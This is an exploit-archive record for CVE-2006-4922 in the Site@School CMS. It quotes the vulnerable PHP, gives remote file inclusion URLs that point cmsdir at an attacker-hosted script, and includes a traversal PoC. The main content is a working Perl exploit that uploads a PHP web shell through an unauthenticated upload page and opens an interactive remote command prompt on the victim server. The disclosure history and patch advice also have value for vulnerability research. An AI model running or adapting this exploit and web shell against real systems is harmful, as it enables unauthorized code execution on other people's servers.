{
  "id": "2374",
  "title": "Site@School 2.4.02 - Arbitrary File Upload",
  "cve": "CVE-2006-4922",
  "vuln_type": "rce",
  "code": "# Title: Site@School 2.4.02 and below Multiple remote Command Execution Vulnerabilities\r\n# Vendor: Site@School\r\n# webiste : http://siteatschool.sourceforge.net/ \r\n# Version : <= 2.4.02\r\n# Severity: Critical \r\n# Discovered by: Simo64 <simo64_at_morx_org> \r\n# Exploit writting by: Simo Ben youssef <simo_at_morx_org>  \r\n# Discovered: 05 Aout 2006\r\n# Published : 15 September 2006\r\n# MorX Security Research Team\r\n# http://www.morx.org \r\n# Original File: http://www.morx.org/school.txt\r\n\r\n# Details\r\n\r\n# Remote File Inclsuion :\r\n\r\n# vulnerable code in starnet/modules/sn_allbum/slideshow.php near line 39 - 46:\r\n\r\n# [code]\r\n# ------------------------------------------------------------------\r\n# if(file_exists(\"$cmsdir/languages/$language/sn_allbum/$language.php\")) \r\n# {\r\n# \t  include(\"$cmsdir/languages/$language/sn_allbum/$language.php\");\r\n# } \r\n# else \r\n# {\r\n#\t include(\"$cmsdir/languages/EN/sn_allbum/EN.php\");\r\n# }\r\n# -------------------------------------------------------------------[/code]\r\n\r\n# vulnerable code in line 91 :\r\n\r\n# [code]\r\n# ----------------------------------------------------------------\r\n#\t include(\"$cmsdir/themes/$themelocation/\".$content_parm[0]); \r\n# ------------------------------------------------------------------[/code]\r\n\r\n# $cmsdir is not properly verified ,can be used to include files from remote\r\n# resources witch would allow a remote attacker to execute arbitary command with the # privilege of the webserver\r\n\r\n# Note : multiple files are affected !\r\n\r\n# Exploit : \r\n\r\n# http://localhost/starnet/modules/sn_allbum/slideshow.php?cmsdir=http://attacker/evilscript.txt?cmd=ls\r\n# http://localhost/starnet/modules/include/include.php?cmsdir=http://attacker/evilscript.txt?cmd=ls\r\n# http://localhost/starnet/themes/editable/main.inc.php?cmsdir=http://attacker/evilscript.txt?cmd=ls\r\n\r\n\r\n# =======================\r\n# Directory Traversal   :\r\n# =======================\r\n\r\n# PoC :\r\n\r\n# http://localhost/starnet/editors/htmlarea/popups/images.php?dir=../../\r\n\r\n# =======================\r\n# Arbitary File Upload  :\r\n# =======================\r\n\r\n# vulnerable code in starnet/editors/htmlarea/popups/images.php near lines 58 - 104\r\n\r\n# [code]\r\n# ----------------------------------------------------------\r\n# $BASE_DIR = $server_path;\r\n# $BASE_ROOT = $user_path.'/'.$media ;\r\n\r\n# if(isset($_FILES['upload']) && is_array($_FILES['upload']) && isset($_POST['dirPath'])) \r\n# {\r\n\r\n#\t $dirPathPost = $_POST['dirPath'];\r\n#\t if(strlen($dirPathPost) > 0) \r\n#\t {\r\n#\t\t if(substr($dirPathPost,0,1)=='/') \r\n#\t\t\t $IMG_ROOT .= $dirPathPost;\t\t\r\n#\t\t else\r\n#\t\t\t $IMG_ROOT = $dirPathPost;\t\t\t\r\n#\t }\r\n\r\n#\t if(strrpos($IMG_ROOT, '/')!= strlen($IMG_ROOT)-1) \r\n#\t\t $IMG_ROOT .= '/';\r\n\r\n#\t do_upload($_FILES['upload'], $BASE_DIR.$BASE_ROOT.$dirPathPost.'/');\r\n# }\r\n\r\n# /*[morx] do_upload function code [/morx]*/\r\n\r\n\r\n# function do_upload($file, $dest_dir) \r\n# {\r\n# \tglobal $clearUploads, $perm;\r\n\r\n# \tif(is_file($file['tmp_name'])) \r\n#\t {  \r\n#         # Remove spaces, apostrophe, exclamation marks etc.\r\n#         $str_from = \" \\'@!,/\\\\\\t\\*?`\\\"\" ;\r\n#         $str_to = str_repeat(\"_\",strlen($str_from));\r\n#         $file_name = strtr($file['name'],$str_from,$str_to);  \r\n#\t\t //var_dump($file); echo \"DIR:$dest_dir\";\r\n#\t\t move_uploaded_file($file['tmp_name'], $dest_dir.$file_name);\r\n#\t \t //get filepermissions from config and chmod it.\r\n#\t\t eval(\"chmod('$dest_dir.$file_name', $perm);\");\r\n#\t }\r\n\r\n#\t $clearUploads = true;\r\n# }\r\n\r\n# ---------------------------------------------------------[/code]\r\n\r\n# the first problem is that starnet/editors/htmlarea/popups/images.php is accessible\r\n# directelly to any user without any authentificagtion , \r\n# the second problem is that the script doesn't verify thefile extension so an attacker needs just to complete the\r\n# condition in line 88 to upload a malicious script\r\n\r\n# Disclosure History:\r\n\r\n# 05 Aout 2006 : Discovered\r\n# 05 Aout 2006 : Contacted Vendor with vulnerabilities information\r\n# 23 Aout 2006 : Vendor released 2.4.03\r\n\r\n# Patch:\r\n\r\n# Upgrade to the latest version.\r\n\r\n# Exploit :\r\n# =========\r\n# [code]\r\n\r\n# C:\\>perl school.pl localhost\r\n\r\n# --- Site@school remote file upload Xploit\r\n# --- Writting By Simo ben youssef / Simo_at_morx_org\r\n# --- MorX Security Research Team\r\n# --- www.morx.org\r\n\r\n# [*] checking if zebi.php was successfully uploaded ...\r\n# [+] zebi.php was successfully uploaded\r\n\r\n# ####################################\r\n# ####     ET VOILA, YOU ARE IN  #####\r\n# ####################################\r\n\r\n# Linux localhost 2.6.12.6-xenU #1 SMP Sun Dec 4 20:49:44 GMT 2005 x86_64 GNU/Linux\r\n\r\n# uid=33(www-data) gid=33(www-data) groups=33(www-data)\r\n\r\n# [www-data@localhost:]#exit\r\n# Connection Closed\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\nif(!defined($ARGV[0])) {\r\n\r\nprint \"\\n--- Site\\@school remote file upload Xploit\\n\";\r\nprint \"--- Writting By Simo ben youssef / Simo_at_morx_org\\n\";\r\nprint \"--- MorX Security Research Team\\n\";\r\nprint \"--- www.morx.org\\n\\n\";\r\n\r\nprint \"--- Usage:   perl $0 <host>\\n\";\r\nprint \"--- Example: perl $0 localhost\\n\\n\";\r\nexit; }\r\n\r\n$TARGET = $ARGV[0];\r\n$PORT   = \"80\";\r\n$SCRIPT = \"starnet/editors/htmlarea/popups/images.php\";\r\n$SHELL  = \"/starnet/media/zebi.php?cmd=\";\r\n$HTTP   = \"http://\";\r\n\r\n\r\n$COMMAND1 = \"POST /$SCRIPT HTTP/1.1\";\r\n$COMMAND2 = \"Accept: image/gif, image/x-xbitmap, image/jpeg,  image/pjpeg, application/x-shockwave-flash, */*\";\r\n$COMMAND3 = \"Accept-Language: en-us\";\r\n$COMMAND4 = \"Content-Type: multipart/form-data; boundary=-------- -------------------7d62e2819048c2\";\r\n$COMMAND5 = \"Accept-Encoding: gzip, deflate\";\r\n$COMMAND6 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;  Windows NT 5.1)\";\r\n$COMMAND7 = \"Host: $TARGET\";\r\n$COMMAND8 = \"Content-Length: 438\";\r\n$COMMAND9 = \"Connection: Keep-Alive\";\r\n$COMMAND9a = \"Cache-Control: no-cache\";\r\n$COMMAND10 = \"-----------------------------7d62e2819048c2\";\r\n$COMMAND11 = 'Content-Disposition: form-data; name=\"dirPath\"';\r\n$COMMAND12 = \"/\";\r\n$COMMAND13 = 'Content-Disposition: form-data; name=\"upload\";  filename=\"C:\\zebi.php\"';\r\n$COMMAND14 = \"Content-Type: application/octet-stream\";\r\n$COMMAND15 = \"<? system(\\$_GET['cmd']\\);exit; ?>\";\r\n$COMMAND16 = 'Content-Disposition: form-data; name=\"upload\"';\r\n$COMMAND17 = \"Upload\";\r\n$COMMAND18 = \"-----------------------------7d62e2819048c2--\";\r\n$COMMAND19 = \"HEAD /starnet/media/zebi.php HTTP/1.1\";\r\n\r\n$remote = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$TARGET\" ,PeerPort=>\"$PORT\")\r\n|| die \"Can't connect to $TARGET\";\r\n\r\nprint \"\\n--- Site\\@school remote file upload Xploit\\n\";\r\nprint \"--- Writting By Simo ben youssef / Simo_at_morx_org\\n\";\r\nprint \"--- MorX Security Research Team\\n\";\r\nprint \"--- www.morx.org\\n\\n\";\r\n\r\n\r\nprint \"[*] Trying to upload zebi.php ...\\n\\n\";\r\n\r\nsleep 2;\r\nprint $remote \"$COMMAND1\\n$COMMAND2\\n$COMMAND3\\n$COMMAND4\\n$COMMAND5\\n$COMMAND6\\n$COMMAND7\\n$COMMAND8\\n$COMMAND9\\n$COMMAND9a\\n\\n\";\r\n\r\nprint $remote \"$COMMAND10\\n$COMMAND11\\n\\n$COMMAND12\\n$COMMAND10\\n$COMMAND13\\n$COMMAND14\\n\\n$COMMAND15\\n$COMMAND10\\n$COMMAND16\\n\\n$COMMAND17\\n$COMMAND18\\n\\n\";\r\n\r\nprint \"[*] checking if zebi.php was successfully uploaded ...\\n\";\r\n\r\nprint $remote \"$COMMAND19\\n$COMMAND7\\n$COMMAND9\\n$COMMAND9a\\n\\n\";\r\n\r\nwhile ($output = <$remote> ) {\r\nif ($output =~ /200 OK/) {\r\nprint \"[+] zebi.php was successfully uploaded\\n\\n\";\r\n\r\n$cmd2   = \"uname -n\";\r\n$cmd3   = \"whoami\";\r\n$cmd4   = \"uname -a\";\r\n$cmd5   = \"id\";\r\n$unamea = \"$HTTP$TARGET$SHELL$cmd4\";\r\n$id     = \"$HTTP$TARGET$SHELL$cmd5\";\r\n$uname  = \"$HTTP$TARGET$SHELL$cmd2\";\r\n$whoami = \"$HTTP$TARGET$SHELL$cmd3\";\r\n$w      = get($whoami);\r\n$u      = get($uname);\r\nchomp($w);\r\nchomp($u);\r\n$ua     = get($unamea);\r\n$i      = get($id);\r\nprint \"####################################\\n\";\r\nprint \"####     ET VOILA, YOU ARE IN  #####\\n\";\r\nprint \"####################################\\n\\n\";\r\n\r\nprint \"$ua\\n$i\";\r\n\r\nwhile () {\r\n\r\nprint \"\\n[$w\\@$u:]#\";\r\n\r\nchomp($cmd=<STDIN>);\r\nif ($cmd eq \"exit\") \r\n{ \r\nprint \"Connection Closed\\n\";\r\n$remote->flush();\r\nclose($remote);\r\nexit;\r\n}\r\n\r\n$LEHWA   = \"$HTTP$TARGET$SHELL$cmd\";\r\n\r\nif($cmd eq \"\")\r\n{ \r\nprint \"empty command ! for help, type help\\n\"; }\r\nelse\r\n{ \r\ngetprint($LEHWA)\r\n}\r\n}\r\n$a = 1\r\n}\r\n}\r\n\r\nif ($a == 0)\r\n{ print \"[-] failed\\n\";\r\n}\r\n$remote->flush();\r\nclose($remote);\r\nexit;\r\n\r\n# Disclaimer:\r\n\r\n# This entire document is for eductional, testing and demonstrating purpose only.\r\n# Modification use and/or publishing this information is entirely on your OWN risk.\r\n# I cannot be held responsible for any of the above.\r\n\r\n# milw0rm.com [2006-09-15]",
  "url": "https://www.exploit-db.com/exploits/2374"
}